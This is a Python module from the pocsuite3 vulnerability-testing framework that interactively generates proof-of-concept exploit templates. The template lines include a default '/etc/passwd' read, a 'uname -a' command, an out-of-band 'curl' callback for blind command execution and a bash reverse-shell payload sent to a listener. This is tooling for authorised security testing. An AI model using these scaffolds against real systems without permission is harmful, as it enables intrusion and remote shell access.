import sys
import datetime
from collections import OrderedDict
from pocsuite3 import __version__
from pocsuite3.lib.core.data import logger, conf


def new_poc():
    print('You are about to be asked to enter information that will be used to create a poc template.\n'
          'There are quite a few fields but you can leave some blank.\n'
          'For some fields there will be a default value.\n'
          '-----')

    today = datetime.date.today().strftime('%Y-%m-%d')
    vulID = input('Seebug ssvid (eg, 99335) [0]: ') or '0'
    author = input('PoC author (eg, Seebug) []: ')
    vulDate = input(f'Vulnerability disclosure date (eg, 2021-8-18) [{today}]: ') or today

    references = ''
    if vulID.isdigit() and int(vulID) > 0:
        references = f'https://www.seebug.org/vuldb/ssvid-{vulID}'
    references = input(f'Advisory URL (eg, https://www.seebug.org/vuldb/ssvid-99335) [{references}]: ') or references
    references = list(filter(None, list(map(str.strip, references.split(',')))))

    cveNumber = input('Vulnerability CVE number (eg, CVE-2021-22123) []: ')
    vendorName = input('Vendor name (eg, Fortinet) []: ')
    appName = input('Product or component name (eg, FortiWeb) []: ')
    appVersion = input('Affected version (eg, <=6.4.0) []: ')
    appPowerLink = input('Vendor homepage (eg, https://www.fortinet.com) []: ')

    vulTypes = [
        'Arbitrary File Read',
        'Code Execution',
        'Command Execution',
        'Denial Of service',
        'Information Disclosure',
        'Login Bypass',
        'Path Traversal',
        'SQL Injection',
        'SSRF',
        'XSS'
    ]
    message = '\n'
    for i, vul in enumerate(vulTypes):
        message += "{0}    {1}\n".format(i, vul)
    print(message)

    vulType = input('Vulnerability type, choose from above or provide (eg, 3) []: ') or 'Other'
    if vulType.isdigit() and int(vulType) < len(vulTypes):
        vulType = vulTypes[int(vulType)]

    needAuth = input('Authentication Required (eg, yes) [no]: ')
    needAuth = True if needAuth.lower().startswith('y') else False

    rceVul = True if vulType in ['Code Execution', 'Command Execution'] else False

    echoRce = False
    oobServer = ''
    if rceVul:
        echoRce = input('Can we get result of command (eg, yes) [no]: ')
        echoRce = True if echoRce.lower().startswith('y') else False
        if not echoRce:
            oobServer = input('Out-of-band server to use (eg, interactsh) [ceye]: ')
            oobServer = 'interactsh' if oobServer.lower().startswith('i') else 'ceye'

    pocName = [vendorName, appName]
    if needAuth:
        pocName.append('Post-Auth')
    else:
        pocName.append('Pre-Auth')
    pocName.append(vulType)
    if cveNumber:
        pocName.append(f'({cveNumber})')
    pocName = ' '.join(list(filter(None, pocName)))
    pocName = input(f'PoC name [{pocName}]: ') or pocName

    codes = OrderedDict([
        (0, '#!/usr/bin/env python3'),
        (1, '# -*- coding: utf-8 -*-'),
        (2, ''),
        (3, 'from pocsuite3.api import ('),
        (4, '    minimum_version_required, POCBase, register_poc, requests, logger,'),
        (5, '    OptString, OrderedDict,'),
        (6, '    random_str,'),
        (7, '    CEye,'),
        (8, '    Interactsh,'),
        (9, '    get_listener_ip, get_listener_port, REVERSE_PAYLOAD'),
        (10, ')'),
        (11, ''),
        (12, "minimum_version_required('%s')" % __version__),
        (13, ''),
        (14, ''),
        (15, 'class DemoPOC(POCBase):'),
        (16, "    vulID = '%s'" % vulID),
        (17, "    version = '1'"),
        (18, "    author = '%s'" % author),
        (19, "    vulDate = '%s'" % vulDate),
        (20, "    createDate = '%s'" % today),
        (21, "    updateDate = '%s'" % today),
        (22, "    references = %s" % str(references)),
        (23, "    name = '%s'" % pocName),
        (24, "    appPowerLink = '%s'" % appPowerLink),
        (25, "    appName = '%s'" % appName),
        (26, "    appVersion = '%s'" % appVersion),
        (27, "    vulType = '%s'" % vulType),
        (28, "    desc = 'Vulnerability description'"),
        (29, "    samples = ['']"),
        (30, "    install_requires = ['']"),
        (31, "    pocDesc = 'User manual of poc'"),
        (32, "    dork = {'zoomeye': ''}"),
        (33, "    suricata_request = ''"),
        (34, "    suricata_response = ''"),
        (35, ''),
        (36, '    def _options(self):'),
        (37, '        o = OrderedDict()'),
        (38, "        o['user'] = OptString('', description='The username to authenticate as', require=True)"),
        (39, "        o['pwd'] = OptString('', description='The password for the username', require=True)"),
        (40, "        o['cmd'] = OptString('uname -a', description='The command to execute')"),
        (41, "        o['filepath'] = OptString('/etc/passwd', description='The full path to the file to read')"),
        (97, "        o['param'] = OptString('', description='The param')"),
        (42, '        return o'),
        (43, ''),
        (44, "    def _exploit(self, param=''):"),
        (45, "        if not self._check(dork=''):"),
        (46, '            return False'),
        (47, ''),
        (48, "        user = self.get_option('user')"),
        (49, "        pwd = self.get_option('pwd')"),
        (50, "        headers = {'Content-Type': 'application/x-www-form-urlencoded'}"),
        (51, "        payload = 'a=b'"),
        (52, '        res = requests.post(self.url, headers=headers, data=payload)'),
        (100, '        logger.debug(res.text)'),
        (53, '        return res.text'),
        (54, ''),
        (55, '    def _verify(self):'),
        (56, '        result = {}'),
        (57, "        param = ''"),
        (58, '        flag = random_str(6)'),
        (59, "        param = f'echo {flag}'"),
        (60, '        oob = Interactsh()'),
        (61, "        url, flag = oob.build_request()"),
        (62, '        oob = CEye()'),
        (63, "        v = oob.build_request(value='')"),
        (64, "        url, flag = v['url'], v['flag']"),
        (65, "        param = f'curl {url}'"),
        (99, "        param = '/etc/passwd'"),
        (66, '        res = self._exploit(param)'),
        (67, '        if res:'),
        (68, '        if res and flag in res:'),
        (69, '        if oob.verify(flag):'),
        (70, '        if oob.verify_request(flag):'),
        (98, "        if res and ':/bin/' in res:"),
        (71, "            result['VerifyInfo'] = {}"),
        (72, "            result['VerifyInfo']['URL'] = self.url"),
        (73, "            result['VerifyInfo'][param] = res"),
        (74, '        return self.parse_output(result)'),
        (75, ''),
        (76, '    def _attack(self):'),
        (78, '        result = {}'),
        (79, "        param = self.get_option('cmd')"),
        (80, "        param = self.get_option('filepath')"),
        (81, "        param = self.get_option('param')"),
        (82, '        res = self._exploit(param)'),
        (83, "        result['VerifyInfo'] = {}"),
        (84, "        result['VerifyInfo']['URL'] = self.url"),
        (85, "        result['VerifyInfo'][param] = res"),
        (86, '        return self.parse_output(result)'),
        (87, ''),
        (88, '    def _shell(self):'),
        (89, '        return self._verify()'),
        (90, '        try:'),
        (91, '            self._exploit(REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port()))'),
        (92, '        except Exception:'),
        (93, '            pass'),
        (94, ''),
        (95, ''),
        (96, 'register_poc(DemoPOC)')])

    rows_to_remove = list()

    if oobServer != 'ceye':
        rows_to_remove += [7, 62, 63, 64, 70]

    if oobServer != 'interactsh':
        rows_to_remove += [8, 60, 61, 69]

    if oobServer == '':
        rows_to_remove += [65]

    if not echoRce:
        rows_to_remove += [58, 59, 68]

    if not needAuth:
        rows_to_remove += [38, 39, 48, 49]

    if vulType not in ['Arbitrary File Read', 'Path Traversal']:
        rows_to_remove += [41, 80, 98, 99]

    # if vul is rce, the shell mode is required
    if rceVul:
        rows_to_remove += [89]
    else:
        rows_to_remove += [9, 40, 79, 90, 91, 92, 93]

    if vulType in ['Arbitrary File Read', 'Code Execution', 'Command Execution', 'Path Traversal']:
        rows_to_remove += [57, 67, 81, 97]

    for i in set(rows_to_remove):
        codes.pop(i)

    poc_codes = ''
    for _, c in codes.items():
        poc_codes += f'{c}\n'

    chars = '()'
    filepath = f'./{vulDate.replace("-", "")}_{pocName}.py'.replace(' ', '_').lower()
    for c in chars:
        filepath = filepath.replace(c, '')
    filepath = input(f'Filepath in which to save the poc [{filepath}]') or filepath
    with open(filepath, 'w+') as fw:
        fw.write(poc_codes)

    logger.info(f'Your poc has been saved in {filepath} :)')


def create_poc_plugin_template():
    if not conf.new:
        return
    try:
        new_poc()
    except KeyboardInterrupt:
        logger.error('KeyboardInterrupt')

    sys.exit()
